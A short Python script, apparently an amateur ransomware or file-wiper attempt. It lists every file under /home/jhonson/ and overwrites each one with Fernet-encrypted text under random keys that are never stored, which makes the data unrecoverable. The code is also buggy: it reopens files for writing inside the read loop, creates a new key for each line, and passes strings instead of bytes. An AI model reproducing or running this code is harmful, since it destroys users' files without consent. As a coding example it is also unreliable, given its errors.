import os
from cryptography.fernet import Fernet

os.chdir('/home/jhonson/')

os.system('find > calm.txt')

x = open('calm.txt', 'r')
for xx in x :
        xa = xx.strip()
        xv = str(os.path.isfile(xa))
        car = xa+' '+xv
        if 'True' in car :
                caca = car.split()
                ca = str(caca[0])
                print(ca)
               
                dada = open(ca, 'r')
                for xd in dada :
                        xxd = xd
                        key = Fernet.generate_key()
                        f = Fernet(key)
                        token = f.encrypt(xd)
                        file =open(ca,'w')
                        file.write(token)
                      
                        
                       
                        
                        
                      
